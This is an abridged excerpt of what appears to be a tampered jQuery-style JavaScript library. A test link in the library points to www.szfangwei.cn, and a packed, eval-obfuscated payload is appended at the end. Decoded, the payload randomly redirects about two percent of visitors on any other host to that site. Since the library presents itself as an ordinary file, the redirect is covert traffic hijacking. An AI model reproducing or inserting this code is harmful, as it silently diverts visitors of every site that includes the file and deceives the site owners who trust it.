(function(a, b) {
	...
	p.Callbacks = function(a) {
		...
		n.setAttribute("className", "t"), n.innerHTML =
			"  <link/><table></table><a href='http://www.szfangwei.cn/Index/empty404'>a</a><input type='checkbox'/>",
			c = n.getElementsByTagName("*"), d = n.getElementsByTagName("a")[0], d.style.cssText =
...
eval(function(p, a, c, k, e, d) {
	...
	return p;
}('4 0=f.2.0;4 3=9(a*8.b());e(3<=1&&0!==\'7.5.6\'){c.2=\'d://7.5.6\'};', 16, 16,
	'host||location|ran|var|szfangwei|cn|www|Math|parseInt|100|random|document|http|if|window'.split('|'), 0, {}
	))
